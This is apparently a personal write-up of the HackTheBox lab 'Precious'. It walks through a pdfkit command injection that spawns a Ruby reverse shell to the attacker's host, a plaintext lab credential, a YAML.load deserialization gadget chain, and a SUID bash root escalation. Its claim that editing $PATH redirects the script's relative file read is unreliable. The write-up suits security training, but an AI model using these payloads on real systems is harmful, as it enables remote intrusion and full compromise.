202301211356
Status: #rce #ruby #pdfkit
Tags: [[Labs]]

# Precious
IP: 10.10.11.189

## Recon

Ports open:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

- The domain, `precious.htb` found in a full nmap scan

```
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- The webpage displays a functionality that allows us to convert a remote webpage into a pdf file and give us the file

- Using burp, we discover that the webpage uses `pdfkit v0.8.6`

![[precious_pdfkit.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/precious_pdfkit.png">

- After doing some research on this tool and its version, we find that it is vulnerable to command injection

## Exploitation

- Lets take a look at our payload:

```
http://10.10.14.7:80/?name=%20` ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.7",4444))'`
```

- This will fetch our own website with the name parameter and then inject a command after to get a reverse shell

- We first need to start our website with python 

```py
python3 -m http.server 80
```

- Then we can start up a listener on port `4444` to catch the connection
- Finally, we can send our payload to the url parameter

- This is what it would look like in burp:

![[precious_rce.png]] 

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/precious_rce.png">

## Post Exploitation

- We see that we are the user `ruby` and notice that there is another user named `henry`

- We want to try to laterally move into that user to get closer to root

- After running linpeas, nothing interesing popped up

- However, we continued to do manual enumeration and found a valid credentials for `henry` in a config file within the user's, `ruby`, home directory: `henry:Q3c1AqGHtoI0aXAYFH`

![[precious_creds.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/precious_creds.png">

- Now lets try and privilege escalate to the root user
- We quickly discover that `sudo -l` gives us a particular command that you can run with the user `henry` as the user `root`

```bash
(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

- It seems this command allows us to execute the ruby file
- After reading the ruby file, we learn that it reads from a file known as `dependencies.yml`

```rb
def list_from_file
    YAML.load(File.read("dependencies.yml"))
```

- After doing some research for this line of code, we learn that we can execute commands that are within the `dependencies.yml` file

- Please look at the references section to learn more about this

- Here is what our payload will look like inside of the `dependencies.yml` file:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id # This is where the command goes
         method_id: :resolve
```

- Since the rb code does not explicitely indicate the specific path to the file, we can change our $PATH enviroment variable to add the `/tmp` directory and then just place our new `dependencies.yml` file in that directory

```bash
export PATH=/tmp:$PATH
```

- Finally, we can try and run this command allowed with sudo. Although, this will throw an error, we see that we have successfully executed a command as root

![[precious_rceroot.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/precious_rceroot.png">

- To be able to get root, we can just input the command `chmod +s /bin/bash` to the yml file and then execute the sudo command again

- Finally, we can see that bash now a binary with SUID and can execute:

```bash
/bin/bash -p
```

![[precious_root.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/precious_root.png">
 

---
# References

- https://github.com/shamo0/PDFkit-CMD-Injection
- https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/